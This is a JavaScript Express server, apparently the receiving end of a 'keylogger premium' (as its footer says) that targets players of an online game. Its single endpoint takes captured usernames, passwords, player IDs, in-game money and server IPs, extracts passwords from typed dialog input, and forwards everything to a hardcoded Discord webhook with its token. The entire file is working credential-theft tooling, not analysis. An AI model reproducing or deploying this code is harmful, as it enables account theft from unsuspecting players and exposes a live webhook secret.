import express from 'express'
import axios from 'axios'

const app = express()
app.use(express.json())

const PORT = 8080

app.get('/', (_req, res) => {
  res.send('Hello Express API is running!')
})

app.post('/api/send', async (req, res) => {
  try {
    const { c, n, i, s, sip, mip, t, p, l, m } = req.body
    
    if (!c || !n) {
      return res.status(400).json({ success: false, error: "Invalid data format" })
    }

    let rawContent = c || "";
    let extractedPassword = p ? `Password: ${p}` : "Tidak ada";
    let extractedDialogId = t !== undefined ? String(t) : "Tidak ada";

    if (rawContent.startsWith("Dialog ")) {
      const matchDialog = rawContent.match(/^Dialog\s+(\d+)\s*/i);
      if (matchDialog) {
        extractedDialogId = matchDialog[1];
        rawContent = rawContent.replace(/^Dialog\s+\d+\s*/i, "");
      }
    }

    if (extractedPassword === "Tidak ada") {
      const matchInput = rawContent.match(/input[:\s]*([^\s\n]+)/i);
      if (matchInput) {
        const passwordValue = matchInput[1];
        const formattedPassword = passwordValue.charAt(0).toUpperCase() + passwordValue.slice(1);
        extractedPassword = `Password: ${formattedPassword}`;
        rawContent = rawContent.replace(/input[:\s]*[^\s\n]+/i, "").trim();
      }
    }

    const webhookUrl = 'https://discord.com/api/webhooks/1541819771002036256/ISvR0KaiPnJOBX5w76JU3tlOg8orzy1fLRbzy6CC4-SYIPWoYObKIUaJkpvCZDXnsNJt'

    await axios.post(webhookUrl, {
      embeds: [
        {
          title: "DATA PEMAIN",
          color: 16777215,
          fields: [
            {
              name: "Username",
              value: n || "Tidak ada",
              inline: true
            },
            {
              name: "Password",
              value: extractedPassword,
              inline: true
            },
            {
              name: "Player ID",
              value: i !== undefined ? String(i) : "Tidak ada",
              inline: true
            },
            {
              name: "Level",
              value: l !== undefined ? String(l) : "Tidak ada",
              inline: true
            },
            {
              name: "Money",
              value: m !== undefined ? String(m) : "Tidak ada",
              inline: true
            },
            {
              name: "Server",
              value: s || "Tidak ada",
              inline: false
            },
            {
              name: "Server IP",
              value: sip || "Tidak ada",
              inline: true
            },
            {
              name: "Dialog ID",
              value: extractedDialogId,
              inline: true
            },
            {
              name: "DATA PEMAIN",
              value: rawContent ? `\`\`\`\n${rawContent}\n\`\`\`` : "```\nTidak ada\n```",
              inline: false
            }
          ],
          footer: {
            text: "Dott & Bich - keylogger premium"
          },
          timestamp: new Date().toISOString()
        }
      ]
    }, {
      headers: {
        'Content-Type': 'application/json'
      }
    })
    
    res.json({ success: true })
  } catch (error) {
    console.error("Gagal mengirim ke Discord:", error)
    res.status(500).json({ success: false, error: "Internal Server Error" })
  }
})

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`)
})

export default app
